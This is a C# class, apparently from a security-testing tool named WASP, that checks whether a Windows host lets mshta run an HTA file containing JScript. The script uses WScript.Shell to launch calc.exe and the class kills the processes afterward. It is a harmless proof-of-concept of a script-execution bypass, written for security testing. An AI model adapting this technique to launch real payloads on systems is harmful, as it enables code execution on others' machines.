using System.Diagnostics;
using WASP.Domain.Common.Interfaces;

namespace WASP.Infrastructure.Vulnerabilities.Executions.Mshta
{
    public class MshtaExecuteJScriptExecutionVulnerability : ExecutionVulnerability
    {
        private const string JSCRIPT = @"
                            <script LANGUAGE=""JScript"">
                                new ActiveXObject(""WScript.Shell"").run(""calc.exe"");
                            </script >
                        ";

        private const string JSCRIPT_NAME = $"{nameof(MshtaExecuteJScriptExecutionVulnerability)}.hta";

        private const string JSCRIPT_PROCESS_NAME = $"mshta";

        private const string CALCULATOR_PROCESS = "calc.exe";

        private const string CALCULATOR_PROCESS_NAME = "Calculator";

        private const int DELAY_MS = 2000;

        public override void Cleanup()
        {
            string[] processesToBeStopped = new string[] { CALCULATOR_PROCESS_NAME, JSCRIPT_PROCESS_NAME };
            
            Process.GetProcesses()
                .Where(p => processesToBeStopped.Contains(p.ProcessName))
                .ToList()
                .ForEach(p =>  p.Kill());
        }

        public override bool TryExploit()
        {
            File.WriteAllText(JSCRIPT_NAME, JSCRIPT);

            Process.GetProcessesByName(CALCULATOR_PROCESS)
                .ToList()
                .ForEach(p => p.Close());

            Process.Start(new ProcessStartInfo(JSCRIPT_NAME) { UseShellExecute = true });

            Thread.Sleep(DELAY_MS);

            Process[] processes = Process.GetProcessesByName(CALCULATOR_PROCESS_NAME);

            bool success = processes.Any(p => p.ProcessName == CALCULATOR_PROCESS_NAME);

            if (success)
            {
                Process.GetProcessesByName(CALCULATOR_PROCESS_NAME)
                    .ToList()
                    .ForEach(p => p.Close());
            }

            return success;
        }
    }
}
